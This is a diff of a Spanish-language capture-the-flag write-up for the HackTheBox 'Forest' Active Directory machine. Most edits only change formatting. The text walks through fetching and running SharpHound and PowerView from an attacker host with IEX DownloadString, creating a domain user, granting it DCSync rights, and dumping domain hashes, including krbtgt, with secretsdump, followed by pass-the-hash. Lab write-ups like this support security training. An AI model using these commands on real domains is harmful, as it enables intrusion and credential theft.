@@ -48,7 +48,7 @@ Ahora que sabemos que estamos ante una máquina Windows procedemos al escaneo de
 
 Lanzamos nmap par descubrir los puertos abiertos en la máquina.
 
-```nmap
+```bash
 PORT      STATE SERVICE
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
@@ -86,7 +86,7 @@ Os dejo el código que debe añadirse al archivo de configuración de vuestra sh
 
 Una vez tenemos los puertos en el portapapeles ya lanzo el nmap
 
-```nmap
+```bash
 PORT      STATE SERVICE      VERSION
 53/tcp    open  domain       Simple DNS Plus
 88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-23 13:14:14Z)
@@ -210,19 +210,23 @@ Asique procedo a usar SharpHound.
 
 Abrimos un servidor de python
 
-> `python3 -m http.server 8080`
+`python3 -m http.server 8080`
 
 Subo el script SharpHound con el comando:
 
-> `IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/SharpHound.ps1')`
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/SharpHound.ps1')
+```
 
 Una vez subido lo ejecutamos con los siguientes parámetros
 
-> `*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -Domain HTB.local -zipFileName forest.zip`
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -Domain HTB.local -zipFileName forest.zip
+```
 
 Una vez lanzado el script se genera un archivo zip que analizaremos con la herramienta BloodHound.
 
-```ps
+```powershell
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----        9/23/2022   8:16 AM          18870 20220923081607_BloodHound.zip
@@ -238,25 +242,25 @@ Pero debemos conseguir formar parte de ese grupo
 
 ![](/assets/images/HTB/Forest-HackTheBox/BloodHound2.webp)
 
-> A través de los permisos Generic All podemos añadir usuarios a un grupo o cambiar la contraseña de usuarios. 
+A través de los permisos Generic All podemos añadir usuarios a un grupo o cambiar la contraseña de usuarios. 
 
 Busco información sobre los permisos Generic All para proceder a crear un nuevo usuario y meterlo en el grupo que queremos.
 
-> Creamos un usuario y lo añadimos al dominio.
+1. Creamos un usuario y lo añadimos al dominio.
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user elc4br4 elc4br4 /add /domain 
 The command completed successfully.
 ```
 
-> Añadimos el nuevo usuario al grupo EXCHANGE WINDOWS PERMISSIONS
+2. Añadimos el nuevo usuario al grupo EXCHANGE WINDOWS PERMISSIONS
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add elc4br4
 The command completed successfully.
 ```
 
-> Lo comprobamos:
+3. Lo comprobamos:
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
@@ -269,27 +273,25 @@ Members
 elc4br4
 The command completed successfully.
 ```
-> Ya estamos dentro del grupo
-
+4. Y Ya estamos dentro del grupo
 
 ![](/assets/images/HTB/Forest-HackTheBox/BloodHound1.webp)
 
 Ahora ya podríamos pasar directamente al usuario Adminsitrador a través del permiso WriteDacl
 
-> WriteDACL es un permiso de objeto de Active Directory que otorga acceso de escritura a la Lista de control de acceso discrecional (DACL) del objeto de destino, lo que significa que podemos otorgarnos cualquier privilegio que queramos sobre el objeto. 
+WriteDACL es un permiso de objeto de Active Directory que otorga acceso de escritura a la Lista de control de acceso discrecional (DACL) del objeto de destino, lo que significa que podemos otorgarnos cualquier privilegio que queramos sobre el objeto. 
 
 [https://casimsec.com/2021/05/14/writedacl-and-dcsync/](https://casimsec.com/2021/05/14/writedacl-and-dcsync/)
 
-
 Seguiremos estos pasos:
 
-> Descargar y subir a la máquina vícitima PowerView
+1. Descargar y subir a la máquina vícitima PowerView
 
 Para subirlo la máquina usaremos el servidor python `python3 -m http.server 8080`
 
 Y el siguiente comando que ejecutaremos desde la máquina víctima `*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8080/PowerView.ps1')`
 
-> Otorgar derechos DCSync al usuario creado (elc4br4)
+2. Otorgar derechos DCSync al usuario creado (elc4br4)
 
 ```ps
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8080/PowerView.ps1')
@@ -298,9 +300,9 @@ Y el siguiente comando que ejecutaremos desde la máquina víctima `*Evil-WinRM*
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $creds  -TargetIdentity "DC=HTB,DC=local" -PrincipalIdentity elc4br4 -Rights DCSync
 ```
 
-> A través de secretsdump.py volcamos los hashes 
+3. A través de secretsdump.py volcamos los hashes 
 
-```ps
+```bash
 ❯ sudo ./secretsdump.py htb.local/elc4br4:elc4br4@10.10.10.161
 [sudo] password for elc4br4: 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -314,13 +316,13 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
-> crackmapexec smb -u userfile -H hash
+4. crackmapexec smb -u userfile -H hash
 
 Comprobamos que el hash de Administrador es válido
 
 ![](/assets/images/HTB/Forest-HackTheBox/crackmapexec.webp)
 
-> Iniciar sesión con psexec.py usando el Hash
+5. Iniciar sesión con psexec.py usando el Hash
 
 ![](/assets/images/HTB/Forest-HackTheBox/psexec.webp)
 
